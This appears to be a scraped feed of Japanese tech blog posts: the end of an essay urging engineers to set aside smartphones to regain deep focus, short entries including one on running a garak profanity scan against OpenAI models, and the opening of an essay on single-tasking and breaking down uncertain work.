わせている。やがて気づかないうちに、あなたの欲望そのものが、スマホによって書き換えられている。第三の罠：孤独と向き合うことへの恐怖最も深い層にあるのは、孤独と向き合うことへの恐怖だ。電車に乗った瞬間、スマホを取り出す。エレベーターに乗った瞬間、スマホを取り出す。待ち合わせで相手を待つ間、スマホを取り出す。トイレに入った瞬間、スマホを取り出す。なぜか。何もしない時間が、耐えられないからだ。退屈が怖い。何も考えない時間が怖い。ただじっとしていることが怖い。自分と向き合う時間が怖い。答えの出ない問いと向き合うことが怖い。不確実な状態に留まることが怖い。私たちは、スマホから得られるわかりやすい刺激によって、自らを取り巻く不安や退屈、寂しさを埋めようとしている。常に何かを見て、何かを読んで、何かに反応して、頭を忙しくさせておく。ハイテンションと多忙で、退屈を忘れようとしている。現代社会は、退屈であることを許さない。生産的でなければならない。常に何かをしていなければならない。暇であることは、罪悪だ。でも、この恐怖こそが、深く考える力を奪っている。深く考えるためには、退屈が必要だ。何もしない時間、ぼーっとする時間、頭の中で思考を巡らせる時間。問題について熟考する時間。そして、答えの出ない状態に耐える力。この力を、ある詩人は「ネガティブ・ケイパビリティ」と呼んだ。不確実性に耐える力。謎に耐える力。答えが出ないことに耐える力。この力が、創造性の源泉になる。深い思考の源泉になる。濃い欲望の源泉になる。しかし、スマホを見続けることで、この時間を失っている。常に外部からの刺激を受け続けることで、内側から湧き上がる思考を遮断している。不確実な状態に留まることができず、すぐに「答え」を検索してしまう。退屈に耐えられず、すぐに刺激を求めてしまう。そして、スマホはこの恐怖を利用している。通知は、「あなたは一人じゃない」というメッセージを送る。誰かがあなたのことを考えている。誰かがあなたに反応している。孤独じゃない。しかし、それは本当のつながりではない。表面的な、瞬間的な、データとしてのつながりだ。皮肉なことに、スマホで常につながっているほど、孤独感は増している。表面的なつながりは無数にあるのに、深いつながりは失われている。情報は溢れているのに、本質的な理解は何もない。「つながっているのに寂しい」。この矛盾の正体は、本当の孤独の喪失だ。一人で、深く、何かと向き合う時間。自分の内側の声を聞く時間。答えの出ない問いと対峙する時間。この孤独を、私たちは失っている。孤独を失った結果、深く考える力を失った。濃い欲望を見失い、創造性も失っている。スマホは、あなたの孤独を奪うために設計されている。なぜなら、孤独な時間こそが、スマホを見ない時間だからだ。失われた孤独常時接続の世界で、私たちは「孤独」を失った。ここで言う孤独とは、寂しさのことではない。孤立のことでもない。孤独とは、何か1つのことに取り組み、それに深く集中している状態のことだ。外部からの刺激を遮断し、自分の内側に向き合う時間のことだ。問題について熟考する時間のことだ。深く考えるためには、孤独が必要だ。退屈な時間、ぼーっとする時間、頭の中で思考を巡らせる時間。答えの出ない状態に留まる時間も必要だ。マルチタスクで生活を取り囲んだ結果、何1つに没頭できなくなっている。1つのことに深く集中する孤独を、失っている。そして皮肉なことに、孤独を失った結果、寂しさが増している。表面的なつながりは無数にあるのに、深いつながりは失われている。情報は溢れているのに、本質的な理解は何もない。「つながっているのに寂しい」。この矛盾の正体は、孤独の喪失だ。答えのない状態に耐える力19世紀のある詩人は、ある手紙の中で「ネガティブ・ケイパビリティ」という概念を記した。不確実な状況や答えのない問題に直面したとき、すぐに結論を出そうとせずに、その状態を受け入れる力。これが、深く考える力の本質だ。私たちは、すぐに答えを求めてしまう。問題があれば、すぐに解決策を探す。わからないことがあれば、すぐに検索する。不確実な状態は、不快だ。曖昧さは、耐えられない。でも、最も重要な問いには、すぐに答えが出ない。「自分は本当に何がしたいのか」。「この設計は本質的に正しいのか」。「なぜこのバグが起きるのか」。「このアルゴリズムの根本的な問題は何か」。これらの問いに、即座に答えは出ない。数日考えても、答えは出ない場合もある。数週間考えて、ようやくぼんやりと見えてくる。数ヶ月かけて、やっと本質に辿り着く。その「答えが出ない時間」に耐えられるかどうか。これが、深く考えられる人と、浅くしか考えられない人を、分ける。スマホは、この能力を破壊する。わからないことがあれば、即座に検索できる。答えを知らなくても、数秒で答えが手に入る。不確実な状態に留まる必要がない。退屈な時間を過ごす必要がない。一見、便利に見える。効率的に見える。しかし、即座に答えを得ることで、私たちは「自分で考える」プロセスを失っている。問題と向き合う時間。試行錯誤する時間。仮説を立てて検証する時間。行き詰まって、また考え直す時間。ぐるぐると思考を巡らせる時間。この時間こそが、深い理解を生む。創造性を生む。本質的な解決策を生む。ある数学者は、難問を何年も考え続けた。答えは出なかった。しかし、考え続けた。散歩中に、ふと答えが降りてきた。ある作家は、小説の構想を何ヶ月も温め続けた。すぐには書かなかった。それでも、頭の中で登場人物と対話し続けた。そして、書き始めたとき、物語は自然に流れ出した。あるエンジニアは、難しいバグと何日も格闘した。すぐには原因がわからなかった。だが、コードを読み続け、仮説を立て続けた。そして、ある瞬間、すべてがつながった。これらすべてに共通するのは、「答えが出ない時間」に耐えたこと。不確実な状態に留まったこと。すぐに諦めなかったこと。すぐに別の刺激に逃げなかったこと。ネガティブ・ケイパビリティは、筋肉のようなものだ。使わなければ、衰える。スマホを見続けることで、この筋肉は衰えていく。答えが出ないと、すぐにスマホを見る。退屈だと、すぐにスクロールする。不確実な状態が怖いと、すぐに検索する。そして、脳が学習する。「答えが出ない状態は、耐えなくていい」。「退屈は、すぐに解消していい」。「不確実性は、避けていい」。こうして、深く考える力は、失われていく。でも逆に言えば、この力は鍛え直せる。スマホを置く。答えがすぐに出なくても、検索しない。退屈でも、スクロールしない。不確実な状態に、留まる。最初は苦しい。不快だ。何度もスマホに手が伸びる。でも、耐える。その状態に、留まる。すると、不思議なことが起きる。頭の中で、思考が動き始める。ぼんやりと、アイデアが浮かんでくる。関連していないと思っていたことが、つながり始める。これが、ネガティブ・ケイパビリティを取り戻す、ということだ。答えのない問いと向き合う勇気。不確実な状態に耐える力。退屈を受け入れる余裕。この力があって初めて、私たちは深く考えることができる。本質に辿り着くことができる。創造的な解決策を見つけることができる。スマホは、あなたからこの力を奪っている。毎日、少しずつ。気づかないうちに。でも、あなたは、この力を取り戻すことができる。切り替えのコストと時間の浪費技術書や本が読めなくなるもう1つの直接的な原因は、切り替えのコストだ。コードを書いていて、いい感じで集中している。設計について考えている。難しいバグの原因を探っている。その時、通知が鳴る。「ちょっとだけ」と思って見る。メッセージを読む。返信する。ついでに他の通知も確認する。気づけば10分。エディタに戻る。「あれ、何を考えてたんだっけ」。さっきまで頭の中にあったロジックが、消えている。バグの仮説も、設計のアイデアも、思考の流れも、すべて消えている。もう一度、コードを読み直す。思考を組み立て直す。文脈を取り戻す。集中状態に戻る。それに、また10分かかる。たった一度の通知確認で、20分が消えた。そして、深い集中状態には戻れていない。私たちは「マルチタスク」などできていない。ただ高速に切り替えているだけだ。人間の脳は、一度に1つのことしかできない。切り替えるたびに、前の文脈を捨てて、新しい文脈を読み込み直す。そしてその読み込みには、膨大なコストがかかる。一日に何回切り替えているか。10回か、20回か、50回か。もし一日50回切り替えていて、1回の切り替えに20分かかるとする。その場合、一日1000分、約16時間を切り替えに費やしていることになる。実際の作業時間は、ほとんど残らない。これは大げさな計算ではない。むしろ、現実に近い。一日の大半を「集中し直す」ことに使っている。実際の作業ではなく、集中状態へ戻るために時間を費やしている。そして、さらに悪いことに、スマホがそばにあるだけで、学習能力が落ちる。ある実験で、小学生に同じ小説を読ませた。紙の本で読んだグループと、タブレットで読んだグループ。内容の理解度を測ると、紙の本で読んだグループの方が、遥かによく覚えていた。なぜか。タブレットのグループは、読んでいる最中も、通知や他のアプリの誘惑を無視することに、脳の処理能力を費やしていた。「スマホを見ない」という意志の力を使うことで、学習に使える処理能力が減っていた。スマホが視界に入っているだけで、脳の処理能力の一部が「それを無視する」ことに費やされる。使っていなくても、存在するだけで、集中力を奪っていく。技術書や本が読めなくなる理由は、ここにある。長い論理展開を追うには、深い集中が必要だ。前の章の内容を記憶しながら、次の章を理解する。複数の概念を頭の中で関連付ける。著者の論理の流れを追う。でもスマホがある限り、その深い集中状態に入れない。3ページ読んだら集中力が切れるのは、意志が弱いからではない。脳が、短い刺激に最適化されてしまっているからだ。そして、スマホの存在が、常に注意を引こうとしているからだ。スマホをぼーっと見ていて、なりたい自分になれるかここで、一度立ち止まって考えてほしい。あなたは、どんな自分になりたいのか。深い技術を理解したい。複雑な問題を解決できるようになりたい。本質を見抜く力を持ちたい。創造的な仕事をしたい。長く続けられるエンジニアになりたい。そんな未来を、描いていないだろうか。では、もう1つ問いたい。スマホをぼーっと見ていて、その自分になれるのか。一日4時間、スマホを見る。タイムラインをスクロールする。動画を見る。通知に反応する。なんとなく、時間が過ぎていく。その時間の積み重ねが、なりたい自分を作るのか。答えは、明らかだ。なれない。スマホを見ている時間は、「深く考える筋肉」を使っていない。むしろ、その筋肉を衰えさせている。即時報酬に反応する癖を強化している。浅い情報に満足する習慣を作っている。切り替えを繰り返す脳を育てている。ベンチプレスを上げたいなら、ベンチプレスをやらなければならない。ソファに座ってスマホを見ていても、胸筋は育たない。本を読めるようになりたいなら、本を読む練習をしなければならない。スマホをスクロールしていても、深く考える力は育たない。当たり前のことだ。ところが、私たちは忘れている。なぜなら、スマホを見ることは「何もしていない」ように感じないからだ。情報を得ている。学んでいる。つながっている。そんな錯覚がある。しかし実際は、何も積み上げていない。タイムラインに流れてきた「最新技術」の記事を読んだ。だが、一週間後には忘れている。誰かの「すごい成果」を見た。それでも、自分は何も作っていない。「勉強になる」動画を見た。けれども、何も実践していない。情報を消費することと、理解を深めることは、違う。何かを見ることと、何かを学ぶことは、違う。つながっていることと、成長することは、違う。スマホを見ている時間は、使っているようで、浪費している。動いているようで、停滞している。前進しているようで、後退している。やがて気づいたときには、一年が経っている。三年が経っている。五年が経っている。「あれ、自分は何も変わっていない」。技術書は、相変わらず読めない。深い理解は、相変わらず得られない。複雑な問題は、相変わらず解けない。なりたい自分には、相変わらずなれていない。では、どうすればいいのか。答えは、シンプルだ。なりたい自分になるための筋肉を、鍛える。同時に、その筋肉を衰えさせるものを、遠ざける。深く考える力を、鍛える。あわせて、深く考える力を奪うスマホを、遠ざける。長い文章を読む力を、鍛える。また、短い刺激に最適化された脳を、作り直す。孤独と向き合う力を、鍛える。さらに、常時接続の世界から、距離を取る。これは、選択だ。スマホを見続けて、今の自分のままでいるか。スマホを置いて、なりたい自分に向かって進むか。どちらを選んでも、一年後のあなたは違う場所にいる。スマホを見続けたあなたは、相変わらず「本が読めない」と言っている。相変わらず、浅い理解で満足している。相変わらず、なりたい自分になれていない。スマホを置いたあなたは、技術書が読めるようになっている。深く考える力を取り戻している。複雑な問題へ取り組めるようになり、少しずつ、なりたい自分へと近づいている。一年後のあなたは、今日のあなたが選んだ結果だ。だから、問いたい。スマホをぼーっと見ていて、なりたい自分になれるのか。一度、ちゃんと考えたほうがいい。小さな一歩から始める「今日から、スマホを一切見ない」。そんな決意は、三日で崩れる。依存は、一日では解消しない。脳が短い刺激に最適化されてしまった状態は、すぐには戻らない。退屈に耐える力は、すぐには身につかない。だから、小さく始める。最初は、「朝の最初の1時間だけ、スマホを別の部屋に置く」。それだけでいい。朝起きて、スマホを別の部屋に置く。そして、その1時間で、技術書を読む。コードを書く。設計について考える。何もせず、ぼーっとしていてもいい。最初は退屈だ。手持ち無沙汰だ。何度もスマホを探してしまう。「ちょっとだけ見よう」という衝動が、何度も襲ってくる。でも、耐える。その1時間だけ、耐える。そして、その1時間が終わったら、スマホを見てもいい。完璧を目指さなくていい。ただ、1時間だけ、スマホのない時間を作る。不思議なことに、3日目くらいから変わり始める。退屈が、苦痛ではなくなる。何もしない時間が、心地よくなる。15分だった集中時間が、30分になる。頭の中で、思考が巡り始める。一週間続けたら、次は朝の2時間にする。通勤中もスマホを見ないようにする。仕事中は通知を全部オフにして、1時間に1回だけまとめて確認する。小さな変化が、次の変化を呼ぶ。朝の1時間スマホを見ないことができたら、次は午前中ずっと見ない。午前中できたら、午後も2時間見ない。少しずつ、少しずつ、スマホのない時間を増やしていく。そして不思議なことに、スマホを見ない時間が増えると、本当に重要なことが見えてくる。「あれ、別にスマホ見なくても、困らないな」。孤独と濃い欲望を取り戻すスマホを置いた瞬間、静けさが訪れる。最初は、その静けさが不安だ。何かが欠けている感じがする。手持ち無沙汰で、落ち着かない。でも、その静けさに留まる。退屈に耐える。不確実な状態に留まる。答えを検索しない。刺激を求めない。ただ、静けさの中にいる。すると、初めて聞こえてくる声がある。「本当は、何がしたかったんだっけ」。スマホを置いたあるエンジニアは気づいた。「自分は本当は低レイヤーのことが知りたかったんだって」。OSの仕組みやネットワークのプロトコルやメモリ管理といった基礎的なことが、ずっと面白いと感じていた。「でもずっとタイムラインで流れてくるフロントエンドの情報を追いかけてました」。みんながフレームワークについて話しているから自分もやらなきゃって思っていた。本当は興味なかったのに。「スマホを置いて静かな時間を過ごすうちに記憶が蘇ってきたんです」。Linuxのカーネルのコードを読んでワクワクしたこと。TCPの仕組みを知って感動したこと。それが自分の濃い欲望だったんだって。これが、孤独を取り戻すということだ。孤独の中で、薄い欲望が剥がれ落ちていく。他人の模倣だった欲望が、消えていく。「〜しなければならない」が、消えていく。「〜すべき」が、消えていく。そして、濃い欲望が浮かび上がってくる。自分が本当に面白いと感じること。純粋に知りたいこと。心から取り組みたいこと。孤独とは、自分と向き合う時間だ。自己対話の時間だ。答えの出ない問いと向き合う時間だ。ある本に、こう書いてあった。「自分の外側に謎を作り、その謎と繰り返し対峙し、それから様々な問いを受け取る中で、自己対話が実現する」。趣味を持つことの意味は、ここにある。趣味とは、すぐに答えの出ない謎だ。誰かに言われたからではなく、自分が面白いと感じるから取り組む何かだ。効率や生産性とは関係なく、ただ没頭できる何かだ。技術書を読むことも、趣味になりうる。コードを書くことも、趣味になりうる。バグを追うことも、アルゴリズムを考えることも、アーキテクチャを設計することも、すべて趣味になりうる。仕事だから、義務だから、ではなく、純粋に面白いから。誰かに認められるためではなく、自分が知りたいから。この感覚を取り戻すことが、濃い欲望を取り戻すということだ。おわりに本が読めないのは、筋肉が足りないからだ。ベンチプレスを上げたいなら、ベンチプレスをやる。当たり前のことだ。でも、当たり前のことほど、誰もやらない。では、なぜ私たちは、深く考える筋肉を鍛えないのか。一日4時間、スマホを見る。浅い情報をスクロールする。短い動画を見続ける。そして、「本が読めない」と言う。「集中力が続かない」と言う。「深く考えられない」と言う。まるで、それが自分のせいじゃないかのように。それは、筋肉を使っていないからだ。いや、むしろ逆だ。間違った筋肉を、毎日鍛えている。即時報酬に反応する筋肉。すぐに切り替える筋肉。答えをすぐに求める筋肉。スマホを見るたびに、これらの筋肉が強化される。そして、深く考える筋肉は、衰えていく。だから、本が読めない。でも誰も、そのことに気づかない。気づかないふりをしている。しかし、と言っておくべきだろう。筋肉は、鍛え直せる。間違った筋肉を使うのをやめる。正しい筋肉を使い始める。スマホを置く。本を読む。問題と向き合う。最初は、きつい。3ページでも重いと感じる。「やっぱり無理だ」と感じる。それでも、続ける。毎日、少しずつ。一週間続けたら、5ページ読める。一ヶ月続けたら、30分集中できる。三ヶ月続けたら、一時間集中できる。筋肉は、裏切らない。使えば、育つ。これは綺麗事ではない。ただの事実だ。ところが、ほとんどの人は、三日で諦める。「自分には向いてない」と言って、またスマホを見る。そういうものだ。最後に、もう一度問いたい。一年後、あなたはどんな自分になっていたいのか。本が読める自分。深く理解できる自分。複雑な問題へ取り組める自分。そういう未来を、頭の中では描いている。では、その自分へ向かって、今日、何をするのか。スマホをぼーっと見るのか。それとも、スマホを置くのか。選ぶのは、あなただ。でも、ほとんどの人は、選ばない。選んだふりをして、結局何も変えない。「明日から頑張ろう」と言って、今日もスマホを見る。そういうものだ。覚えておいてほしい。一年後のあなたは、今日のあなたが選んだ結果だ。「時間がなかった」と言い訳する一年後のあなたは、今日「ちょっとだけ」とスマホを見たあなたが作った結果だ。長く続けた人が、最も遠くまで行く。長く続けるために必要なのは、才能や知識やスキルではない。深く考える力を、守ることだ。守るかどうかは、あなた次第だ。誰も、あなたを止めない。誰も、あなたを助けない。おい、スマホを置け。それは命令ではない。自分自身への、呼びかけだ。今日、スマホを置く。明日も、スマホを置く。一週間、一ヶ月、一年と、少しずつスマホのない時間を増やしていく。一年後、あなたは気づく。「本が、読めるようになった」。「なりたい自分に、近づいている」。変わったのは、才能じゃない。変わったのは、鍛えた筋肉だ。変わったのは、選んだ習慣だ。変わったのは、スマホを置いた、あなた自身だ。おい、スマホを置け。なりたい自分になれ。このブログを読み終えた瞬間、あなたは何をするだろう。スマホを別の部屋に置くだろうか。それとも、「いい話だった」と感じながら、タイムラインを開くだろうか。結局、ほとんどの人は、後者を選ぶ。そういうものだ。しかし、もしあなたが前者を選ぶなら。もしあなたが本当にスマホを置くなら。一年後、あなたは違う場所にいる。それだけは、確かだ。増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazonネガティヴ・ケイパビリティで生きる ―答えを急がず立ち止まる力作者:谷川嘉浩,朱喜哲,杉谷和哉さくら舎Amazon奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazon欲望の見つけ方　お金・恋愛・キャリア作者:ルーク バージス早川書房Amazon","isoDate":"2025-11-07T03:03:51.000Z","dateMiliSeconds":1762484631000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"garakを用いてOpenAIモデルのProfanityに対する脆弱性検知をしてみた","link":"https://zenn.dev/akasan/articles/2a44f107064f1f","contentSnippet":"今回はOpenAIのモデルを対象に、garakを用いてLLM脆弱性診断をしてみました。先日Gemini 2.5 Flashを対象にlmrc.Profanityという項目を対象に検知をしたのですが、今回はOpenAIが提供しているモデルのうちいくつかのモデルで同じ検知をしてみました。https://zenn.dev/akasan/articles/f7adda4b70a138 実験内容 検知対象まずはgarakで提供されているlmrc.Profanityに対する脆弱性診断を行います。lmrc.Profanityについては以下のページにてどのような検知項目があるかまとまっています...","isoDate":"2025-11-06T13:22:22.000Z","dateMiliSeconds":1762435342000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"短編：テックブログを200日以上毎日書き続けて感じたこと","link":"https://zenn.dev/akasan/articles/5c7b6b70efd302","contentSnippet":"私ごとですが、毎日テックブログを書き始めてから200日を過ぎまして、感じたこととこれからの目標を書いてみようと思います。※ 季節変わり目の風邪を拗らせて短編になります。 これまでの振り返り大きな目標もなくなんとなく始まってからちゃんと200日以上続いて、まずは発信し続けるという習慣がつきました。今までは例えば書籍で何かを勉強しても使う時が来るまで頭の片隅で眠っていることが多かったですが、ブログを書き始めてからは調べたことや自分の経験を文章として発信することで、頭の整理だけでなく理解度を認識して弱点や強みの理解につながりました。2点目としては単純に知識が増えたことです。毎日書くと...","isoDate":"2025-11-05T14:21:04.000Z","dateMiliSeconds":1762352464000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"おい、一つずつやれ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/05/120747","contentSnippet":"はじめに「今日も、何もできなかった」。夜の部屋で、私はその言葉を呟く。また。今日も。仕事をしなかったわけではない。むしろ一日中、何かをしていた。画面を見つめ、キーボードを叩き、メッセージを返し、タブを切り替え続けた。体は疲れている。目も疲れている。頭も疲れている。確かに疲労感はある。なのに、達成感がない。忙しかったのに、何も完了していない。この矛盾が、私を苦しめる。朝、デスクに座った瞬間から、地獄が始まる。Slackを開くと未読の赤いバッジが十件以上浮かんでいる。「全部返信しなければ」。次にメールを開くと新着が三件ある。「これも返信しなければ」。GitHubのタブをクリックするとレビュー依頼が二件待っている。「これも見なければ」。そしてTwitterを開くとタイムラインに流れてくる技術記事のタイトルが目に入る。「これも読まなければ」。全部が重要に見え、全部をやらなければいけない気がする。最新の情報に遅れたら、自分は価値のない人間になってしまう。その恐怖が、私を駆り立てる。だから、全部に手をつける。三十分後、ブラウザに二十以上のタブが開いている。「今日、最初にやろうと思っていたことは、何だっただろう」。思い出せない。これを、一日中繰り返す。夜になって振り返る。Slackのメッセージは半分だけ返信し、メールは一件だけ返信し、GitHubのレビューは途中で止まっている。Twitterの記事は読み切れず、本当に重要なタスクには手をつけることすらできなかった。全部が中途半端で、何ひとつ完了していない。「今日も、何もできなかった」私は、停滞したくなかった。だから、全部をやろうとした。気づけば一日が終わっていた。いろんなことに手をつけたのに、何ひとつ完了していない。停滞を恐れるあまりに、私は停滞していた。前に進もうとして、全部をやろうとして、結局何も完了させず、その場に留まっていた。誰にも指摘されることのない、自分だけが知っている停滞。2025年の今、情報は溢れている。SNSを開けば、誰かが何かを成し遂げている。やるべきことは、無限にある。私は全部をやろうとした。しかし、選択ができなかった。何かを捨てることが、怖かった。「これを捨てたら、停滞してしまうんじゃないか」。その恐怖こそが、選択を妨げていた。全部をやろうとして全部が中途半端になり、何も完了しない日々が、じわじわと私の自己肯定感を蝕んでいった。毎晩、同じ言葉を繰り返す。「今日も、何もできなかった」。こうやって、停滞は完成する。私の停滞は、そうやって完成した。停滞を恐れることで、停滞が生まれる。悲しいことに。振り返ってみれば、全部をやろうとしていたのは自分を信じていなかったからだった。「1つだけでは不十分だ」「1つだけでは成長できない」「1つだけでは遅れてしまう」。そんな不安が、全部に手を出させていた。1つのことを完了させる自分の力を、信じられなかった。でも今は分かる。シングルタスクとは、自分を信じることだ。「この1つを、自分は完了させられる」と信じて、他を手放す勇気。その信頼が、停滞を終わらせる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。なぜ、頭がパンクするのか朝デスクに座ってSlackとメールとGitHubを開くと、気づけば頭の中が真っ白になっている。これは単なる「忙しさ」じゃない。人間の脳には「ワーキングメモリ」という処理領域があり、一度に扱える情報量には限界があるからだ。十個のタスクを同時に考えようとすると、脳は必死にそれらを保持しようとする。しかし保持するだけで力を使い果たしてしまい、本来やるべき思考——どうやってこのコードを書くか、どう問題を解決するか——のための余力が残っていない。これを「認知負荷」と呼ぶらしい。認知負荷には三種類ある。1つ目は内在的負荷で、タスク自体の難しさだ。複雑なコードは、それ自体が頭を使う。2つ目は外在的負荷で、やり方の問題で生まれる無駄な負荷だ。「どのタスクから手をつけるべきか」と迷っている時間。これは本質的な作業じゃない。ただの迷いだ。3つ目は生成的負荷で、学んだり理解したりするための建設的な負荷。これは必要な負荷だ。私が全部のタブを開いて、全部のメッセージを見て、全部に気を取られていた時、外在的負荷が認知資源を食い尽くしていた。本来なら、生成的負荷——実際に学び、成長するための思考——に使うべきリソースが、「何からやるか」という無意味な選択に消費されていた。一つを選ぶということは、他の二つの負荷を減らし、本当に必要な負荷に集中するということだった。不確実性という怪物大きなタスクが重く感じるのは、そのサイズだけじゃなく、その中に含まれる「わからなさ」の総量が原因だった。新しい機能を実装するタスクを前にすると立ち止まってしまうのは、いくつもの「わからない」が同時に襲ってくるからだ。不確実性の五つの層不確実性には、実は5つの異なる層があると思っている。それぞれが、異なる種類の心理的抵抗を生み出す。1つ目は「何をすべきかわからない」（認識的な不確実性）だ。問題の構造自体が不明確で、ゴールの輪郭がぼやけている。「システムの可用性を向上させる」と言われても、何をどこまで作ればいいのか分からない。モニタリング基盤なのか、自動復旧なのか、冗長化設計なのか。全体像が見えない。この不確実性は、タスクの範囲や目的を明確に定義することで解消される。でも一人でやろうとすると、何が「明確」なのかすら分からない。2つ目は「どうやってやるかわからない」（方法論的な不確実性）だ。目標は見えていても、そこに至る道筋が描けない。技術的なアプローチが見えない。どの監視ツールを使うべきか、どう設計すべきか、どの順番で進めるべきか。この不確実性は、タスクを具体的な行動ステップに分解することで縮小する。でも経験が足りないと、どう分解すればいいかも分からない。3つ目は「実際にできるのかわからない」（実行的な不確実性）だ。自分のスキルや利用可能なリソースで本当に達成可能なのかという不安。「これ、自分には難しすぎるんじゃないか」「時間内に終わらないんじゃないか」。この不確実性は、タスクを小さな単位に分割し、1つずつ達成することで払拭される。「少なくともこの部分はできる」という確信を積み重ねる。4つ目は「いつまでかかるのかわからない」（時間的な不確実性）だ。終わりが見えないトンネルに入るような感覚。一週間で終わるのか、一ヶ月かかるのか、半年かかるのか。予測できない。この予測できなさが、着手を躊躇させる。期限を段階的に設定することで、各フェーズの時間的見通しが立つ。でも全体が見えないと、期限の設定すらできない。5つ目は「何をもって完了とするかわからない」（評価的な不確実性）だ。完璧を求めすぎて、「どこまでやれば十分か」の基準がない。あれも追加すべきか、これも改善すべきか。終わりがない。完成度の段階を定義することで、各段階での達成基準が明確になる。でも最初は、その段階分けすらできない。これら5つの「わからない」が1つの大きなタスクの中に渾然一体となっているため、手をつける前から圧倒される。わからないを、段階的にわかるに変えていくでも分割すると何が起きるか。不確実性の解消は、一度に全てを解決するのではなく、階層的な変換プロセスとして機能し、それは4つの段階を経る。第一段階：全体の可視化漠然とした大きなタスクを構成要素に分解する。「何が分かっていて、何が分かっていないか」を明確にする。この段階では、不確実性を解消するのではなく、不確実性を構造化する。システムの可用性を向上させる。まず、次のように紙に書き出してみる。モニタリング基盤の整備自動復旧の仕組み冗長化の設計アラート体制の構築インシデント対応の自動化書き出すだけで変わり、「何が分からないか」が分かる。未知の領域が明確になることで「未知の未知」が「既知の未知」へと変化し、これ自体が心理的な安定をもたらす。なぜなら正体不明の恐怖よりも、範囲が限定された課題の方が対処可能に感じられるからだ。「全部わからない」から「この5つの中で、モニタリングとアラートは何となくイメージできるが、自動復旧の仕組みは全く分からない」へ。この認識の変化が第一歩だった。第二段階：確実性の島を作る全体像が見えたら、最も確実性の高い部分から着手し、「これならできる」という小さな成功体験が確実性の島を作る。5つの中でモニタリング基盤が一番イメージできるため、ここから始めるが、モニタリング基盤もまだ大きいため、さらに次のように分割する。メトリクスの収集設定ダッシュボードの作成アラートルールの定義ログ集約の設定メトリクスの収集設定なら絶対にできるため、これを最初の島にする。CPU使用率、メモリ使用率、ディスクI/Oの監視を設定すると動いた。ここまでは確実にできた。この確実性の島は周囲の不確実な領域を探索するための足場となり、1つの成功は「他の部分も同様にアプローチできる」という仮説を生んで心理的な推進力となる。「メトリクス収集ができた。じゃあ次はダッシュボード。これも同じように1つずつグラフを追加していけばいける」と進めると、やってみるとできた。また1つ、島ができた。第三段階：フィードバックで精度を上げる小さな単位で実行し、結果を観察する。このフィードバックループが、予測精度の向上をもたらす。アラートルールを設定して運用してみると、夜中に誤検知アラートが鳴りまくった。閾値が厳しすぎたとすぐに分かり、小さな単位だから問題の切り分けも簡単で、すぐに修正できた。重要なのは失敗と成功が等しく情報であるということだ。「この閾値ではうまくいかなかった」という知見も不確実性を縮小させ、探索空間が狭まって残りの選択肢がより明確になる。「固定閾値だけじゃ不十分だ。移動平均を使った動的閾値の方がいい」という学びが次のアラート設定の精度を上げた。大きなタスクのまま進めていたら何週間も経ってから「全部やり直し」になっていただろう。しかし小さく分割していたから数時間で軌道修正できた。第四段階：学びを反映して柔軟に変える実行を通じて得られた情報に基づき、当初の計画を修正する。これは計画の失敗ではなく、不確実性に対する適応的な対応。最初は「インシデント対応の自動化」を後回しにしていた。しかし運用を始めるうちに「アラートが鳴っても手動対応では間に合わず、自動復旧の仕組みがないと夜中に起こされ続ける」ことに気づいた。順番を変えて冗長化設計より先に自動復旧スクリプトを作ることにした。硬直した計画は予期しない障害に直面すると崩壊するが、小さな単位で計画と実行を繰り返すアプローチは本質的に柔軟性を持つ。各サイクルで得られた知見が次のサイクルの設計を改善する。「最初の計画通りに進めなかった」ことを失敗だとは思わなくなり、むしろ学びながら最適化している証拠だと思えるようになった。不確実性が行動を止める、本当の理由不確実性が行動を阻害するのは、単に情報が足りないからではない。それは認知的・感情的な複合的反応だった。まず認知的過負荷が起きる。不確実な要素が多すぎると、それらすべてを同時に考慮しようとして思考が麻痺する。分割は、一度に考慮すべき不確実性の数を制限する。「全部を一度に考えなくていい。今はフォームだけ」。この許可が、思考を解放した。次に曖昧性回避がある。人間は不確実性そのものを嫌う傾向があり、明確な損失よりも曖昧な結果の方に心理的苦痛を感じる。「失敗するだろうか」という曖昧な恐怖より、「フォームを作る」という明確なタスクの方が、遥かに取り組みやすかった。そしてコントロール感の喪失だ。大きく不確実なタスクは、「自分の手に負えない」という無力感を生む。小さな単位に分割することで、「少なくともこの部分はコントロールできる」という感覚が回復する。「全体は分からなくても、この一歩はコントロールできる」。この感覚が、行動を可能にした。モニタリング基盤が完成して動いており、アラートが鳴り、自動復旧が動く。気づけば「システムの可用性向上」という大きなタスクができていた。マルチタスクの代償企画書を書いていて集中しており、いい感じで進んでいるときSlackの通知が鳴る。「ちょっとだけ」と思って見るとスレッドを読んで返信し、他のメッセージも気になっていくつか読んでしまう。資料に戻ると何を書いていたんだっけという状態になる。さっきまで頭の中にあった構成が消えて、次の章のアイデアも論理の流れもぼやけている。もう一度書きかけの文章を読み直して思い出そうとするが集中力を取り戻すのに時間がかかる。これを一日に何回も繰り返している。資料を作ってはSlackを見て戻って集中し直し、メールが来たら見てまた戻って集中し直し、チャットの通知が来たら見て戻って集中し直す。切り替えるたびに頭がリセットされ、切り替えるたびに最初から組み立て直す必要がある。私たちは「マルチタスク」と呼ぶが、実際にはマルチタスクなんてできていない。ただ高速に切り替えているだけで、脳は1つのことしかできないため、切り替えるたびに前の文脈を捨てて新しい文脈を読み込み直す。そしてその読み込みには膨大なコストがかかる。一度Slackを見ただけで集中するまでに何分もかかり、メールを見ただけで集中するまでに何分もかかる。私は一日に何回切り替えているだろうか。10回か、20回か、50回か。一日の大半を「集中し直す」ことに使っており、実際の作業ではなく集中状態へ戻ることに時間を費やしている。そして切り替えている最中はどちらにも集中できていない。資料のことを考えながらSlackを見て、Slackのことを考えながら資料を作る。どちらも中途半端だ。全部やろうとしている時、私は何も完了させていなかった。それでも生産的だと感じていたのは忙しさと生産性を混同していたからだ。画面は動いていて指も動いていて頭も回っているが、何も完了していない。そしてこの「何も完了していない」という事実が、じわじわと自己肯定感を蝕んでいった。「今日もできなかった」「自分は無能だ」「きっと才能がないんだ」という声が繰り返され、朝起きるのが辛くなり、デスクに座るのも億